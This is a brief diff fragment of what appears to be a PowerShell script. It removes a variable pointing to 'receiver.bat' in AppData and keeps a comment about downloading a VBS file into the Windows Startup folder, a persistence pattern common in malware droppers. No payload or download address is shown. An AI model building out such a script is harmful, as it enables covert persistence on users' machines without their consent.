@@ -17,9 +17,6 @@ try {
     Write-Host "Failed to execute PowerShell script: $_"
 }
 
-# Define the path to receiver.bat in AppData\Local
-$receiverPath = "$env:APPDATA\receiver.bat"
-
 
 # Download the VBS file to the Startup folder
 try {
